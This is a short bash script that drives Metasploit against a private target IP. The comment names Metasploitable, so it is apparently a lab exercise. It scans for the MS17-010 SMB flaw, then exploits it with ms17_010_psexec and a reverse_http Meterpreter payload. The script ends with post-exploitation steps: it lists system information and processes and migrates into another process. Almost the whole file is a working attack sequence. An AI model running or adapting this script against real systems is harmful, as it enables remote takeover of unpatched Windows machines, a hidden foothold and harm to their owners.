#!/bin/bash

# Define the target IP address
target="<192.168.68.1>"


# Open Metasploitable
echo "Opening Metasploitable..."
sudo msfconsole -q -x "
search smb
grep scanner search smb

use auxiliary/scanner/smb/smb_ms17_010
show options

set RHOSTS $target
run

grep exploit search smb

use exploit/windows/smb/ms17_010_psexec
show options

set RHOSTS $target
set payload windows/meterpreter/reverse_http
show options

exploit

sysinfo

ps

migrate 4020
exit
"
